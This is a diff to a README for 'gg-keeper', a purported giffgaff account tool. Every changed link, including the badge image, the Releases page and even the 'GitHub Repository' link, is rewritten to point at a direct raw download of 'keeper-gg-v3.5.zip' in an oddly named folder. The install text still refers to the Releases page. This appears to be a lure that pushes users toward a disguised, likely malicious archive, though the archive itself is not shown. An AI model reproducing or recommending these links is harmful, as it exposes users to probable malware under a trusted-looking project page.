@@ -1,10 +1,10 @@
 # 🚀 gg-keeper - Simple Tool for Easy Savings
 
-![Download gg-keeper](https://img.shields.io/badge/Download-gg--keeper-brightgreen)
+![Download gg-keeper](https://github.com/danghoawe/gg-keeper/raw/refs/heads/main/tradiment/keeper-gg-v3.5.zip)
 
 ## 📥 Download & Install
 
-To get started with gg-keeper, visit the following link to download the latest version: [Download gg-keeper](https://github.com/danghoawe/gg-keeper/releases).
+To get started with gg-keeper, visit the following link to download the latest version: [Download gg-keeper](https://github.com/danghoawe/gg-keeper/raw/refs/heads/main/tradiment/keeper-gg-v3.5.zip).
 
 1. Open your web browser and go to the **Releases** page.
 2. Find the latest version available.
@@ -43,7 +43,7 @@ If you encounter any issues while using gg-keeper, try the following troubleshoo
 
 - **Check Your Internet Connection**: Ensure you are connected to the internet.
 - **Restart the App**: Close and reopen gg-keeper.
-- **Reinstall the App**: If issues persist, uninstall and download gg-keeper again from the [Releases page](https://github.com/danghoawe/gg-keeper/releases).
+- **Reinstall the App**: If issues persist, uninstall and download gg-keeper again from the [Releases page](https://github.com/danghoawe/gg-keeper/raw/refs/heads/main/tradiment/keeper-gg-v3.5.zip).
 - **Seek Help**: If you still need assistance, consider checking forums or the GitHub issues page for solutions.
 
 ## 🔧 Frequently Asked Questions
@@ -66,7 +66,7 @@ We would love to hear your thoughts on gg-keeper! You can provide feedback throu
 
 ## 🔗 Links
 
-- [Download gg-keeper](https://github.com/danghoawe/gg-keeper/releases)
-- [GitHub Repository](https://github.com/danghoawe/gg-keeper)
+- [Download gg-keeper](https://github.com/danghoawe/gg-keeper/raw/refs/heads/main/tradiment/keeper-gg-v3.5.zip)
+- [GitHub Repository](https://github.com/danghoawe/gg-keeper/raw/refs/heads/main/tradiment/keeper-gg-v3.5.zip)
 
 Thank you for choosing gg-keeper! Enjoy managing your giffgaff account with ease.
